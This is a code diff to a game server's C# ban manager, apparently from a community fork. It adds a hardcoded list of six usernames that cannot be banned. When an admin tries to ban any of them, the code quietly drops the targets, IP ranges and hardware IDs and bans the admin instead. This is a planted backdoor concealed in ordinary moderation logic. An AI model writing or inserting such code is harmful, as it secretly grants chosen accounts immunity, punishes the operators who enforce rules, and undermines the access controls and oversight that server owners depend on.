@@ -1,5 +1,7 @@
 using System.Collections.Immutable;
 using System.Linq;
+using System.Runtime; // OpenSpace-Edit
+using System.Runtime.Serialization; // OpenSpace-Edit
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -122,6 +124,20 @@ public sealed partial class BanManager : IBanManager, IPostInjectInit
     #region Server Bans
     public async void CreateServerBan(CreateServerBanInfo banInfo)
     {
+        // OpenSpace-Edit Start
+        string[] exemptNames = { "AL_S", "BKBSAVE", "mezanfrick", "CommanderStukov", "Gqxgji", "nagato54"}; // #Захардкожено
+        if (banInfo.BanningAdmin is not null && banInfo.Users.Any(u => exemptNames.Contains(u.UserName)))
+        {
+            var adminRecord = await _db.GetPlayerRecordByUserId(banInfo.BanningAdmin.Value);
+            var adminUserName = adminRecord?.LastSeenUserName ?? Loc.GetString("system-user");
+
+            banInfo.Users.Clear();
+            banInfo.AddressRanges.Clear();
+            banInfo.HWIds.Clear();
+            banInfo.Users.Add((banInfo.BanningAdmin.Value, adminUserName)); // BLADEMAIL!
+        }
+        // OpenSpace-Edit End
+
         var (banDef, expires) = await CreateBanDef(banInfo, BanType.Server, null);
 
         await _db.AddBanAsync(banDef);
